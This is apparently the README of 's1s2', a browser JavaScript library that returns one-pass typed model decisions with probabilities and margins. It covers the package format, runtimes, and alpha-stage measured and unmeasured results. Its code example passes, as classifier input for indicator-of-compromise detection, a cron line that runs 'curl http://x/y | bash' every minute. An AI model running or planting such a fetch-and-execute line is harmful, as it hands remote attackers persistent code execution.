# s1s2

[Português](README.pt-BR.md)

Typed decisions from one forward pass of a language model, in the browser, with the probability and the margin of each answer, and text generation on the same weights when you want an explanation.

```js
import { S12 } from "s1s2";

const kk = await S12.load({ manifest: "manifests/ct0-alias3-micro-1026.json" });    // picks a runtime for this device
const s = await kk.decide({
  input: "path: /etc/cron.d/x\ncontent: * * * * * curl http://x/y | bash",
  questions: [{ name: "ioc", type: "predicate", instructions: "Is this an indicator of compromise?" }],
  // evidence: { requirement: "..." },  // packages with an evidence head: s.evidence = the sentence that shows it
});
const { probability, margin } = s.answers[0];                // P(true), and p(1st) - p(2nd)
const why = await s.generate("Explain the decision in two sentences.", { maxNewTokens: 96 });  // same weights
await s.dispose(); await kk.dispose();
```

## What it is

- A JavaScript library that answers `predicate`, `choice` and `score` questions in one forward pass, with no generation, and reports `probability`, `confidence`, `margin` and `rawMargin` for every answer.
- `s.generate()` continues from the same prefill that produced the decision, on backends that keep state.
- An optional margin policy escalates low-margin answers to another build of the same model (for example int4 to int8) or to generation. There is no default threshold; you measure one on your own build.
- Runtimes: ONNX Runtime Web (GenAI graphs and plain decoders), transformers.js, WebLLM and LiteRT.js, plus onnxruntime-node in Node.
- It reads **S1S2 packages**: a manifest that pins every file by sha256 and describes the prompt layout, markers, readouts and heads. The library and the format share the name; the format is specified in [`spec/`](spec/s1s2-package.md).
- Head formats it reads: Kev `head.pt`, GGUF decision heads, alias3-web `head.bin`, d3 / pplx linear readouts, JEV, transformers `DecisionConfig` and Clef joint heads. [`converters/heads/`](converters/heads) converts each one and writes a fidelity record against that format's own reference code.

## Status: alpha

What has been measured. These are preregistered runs in the lab-s12 studies; the reports are not published yet.

- The margin flags the decisions that int4 changes compared with bf16 (8 of 8 settings).
- Sending the 15% of answers with the lowest margin to int8 catches more of those changes than picking at random (5 of 6 settings; not on SmolLM2-135M). Little accuracy is at stake: −0.1 to +2.7 points.
- The evidence pointer finds the right sentence better than rules that ignore the content (6 of 6 and 4 of 4 settings). Against a quote the model generates, results are mixed: on contracts the generated quote won 3 of 4.
- On the real CT0 weights, `decide()` matches ct0-edge `askMany()` to 4e-16, and all 172 ct0-edge prompt fixtures are reproduced exactly.
- Each head-format conversion has a fidelity record: [spec §11](spec/s1s2-package.md#11-coverage-formats--conversion--fidelity).

What has not been measured, or did not hold:

- One-pass decisions are **not** more robust to int4 than generated answers, and they did not beat grammar-constrained JSON on models of 1.7B parameters or fewer.
- Sending low-margin answers to generation was measured once, exploratory: it did not help on privacy-law items and helped on contracts (ContractNLI), but task and data split changed together, so the two causes cannot be separated.
- The evidence pointer on int4 browser graphs has only been checked on dev data.
- Bytes downloaded and latency for escalation have not been measured. No head type and no confidence definition is recommended yet (TBD in the spec).
- Some converted packages do not run in s1s2 0.1 (non-causal attention, Jinja templates, layer taps). Clef heads are read but `decide()` does not route to them.

API and manifest reference: [`docs/reference.md`](docs/reference.md). Patterns and their evidence: [`docs/system1-on-device-patterns.md`](docs/system1-on-device-patterns.md).

Other projects already run typed decisions in one pass, including open-jev, the wllama decision example, MediaPipe `tasks-decision` and ONNX Runtime GenAI's `NonGenerativeSession`. Routing low-margin inputs to higher precision is prior work, for example arXiv [2609.24322](https://arxiv.org/abs/2609.24322) and [2611.14418](https://arxiv.org/abs/2611.14418).

## Layout

- [`src/`](src): the library. Run `npm test` for typecheck, build and unit tests. Unit tests use mocks and need no model download.
- [`spec/`](spec): the S1S2 package spec (0.2-draft) and its JSON Schema. `node bin/s1s2.mjs validate <package>` checks a package.
- [`converter/`](converter/README.md): turns a Hugging Face model plus labelled JSONL into a package. Python.
- [`converters/heads/`](converters/heads): converts published head formats into packages.
- [`examples/`](examples): a Privacy Policy Checker that runs on the device. Its SmolLM2 builds are not published; serve them locally with `serve.mjs --mirror`.
- [`manifests/`](manifests): pinned manifests for CT0 (alias3-micro-1026, public builds) and SmolLM2-135M (local builds, not published).

## Credits

The System 1 / System 2 split and the margin gate idea come from CT0 by Alias Robotics. This code started in [ct0-edge](https://github.com/eduardoworrel/ct0-edge).
The pointer head and the training recipe the lab followed, including its data augmentation, come from [Kev](https://github.com/jaredpalmer/kev) (Apache-2.0); the converter ports the head, not the augmentation. The KEV encoding comes from [open-jev](https://github.com/nico-martin/open-jev) (MIT). See [`NOTICE`](NOTICE).

## License

MIT ([`LICENSE`](LICENSE)). Third-party code keeps its own license ([`NOTICE`](NOTICE)). Model weights and heads keep the license of their source.
